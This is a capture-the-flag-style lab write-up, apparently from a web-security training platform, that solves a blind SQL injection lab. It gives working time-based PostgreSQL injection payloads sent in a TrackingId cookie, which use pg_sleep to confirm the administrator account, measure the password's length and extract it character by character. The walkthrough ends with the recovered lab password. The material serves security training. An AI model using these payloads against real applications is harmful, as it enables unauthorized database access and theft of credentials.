Title: Blind SQL injection with time delays and information retrieval
Level: PRACTITIONER
Desc:  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

# Walkthrough:
Sending request to root of site with cookie TrackingId changed to contain exploit:
`TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
It made application sleep.

Next payload: 
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
We get response with delay so we know, that username administrator exists.

We add `+AND+LENGTH(password)>1` to calculate length of administrator's password.

Password is made from 20 characters.

Next payload is dedicated to iterate through all combintations and to "guess" administrator's password char by char.
`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

<img width="1066" height="136" alt="image" src="https://github.com/user-attachments/assets/1d327738-83a2-4605-8d02-9de8cd9239a5" />
Now we need to iterate through that process 20 times to get full password.

`58u4n167z9yiemmiu9a0`



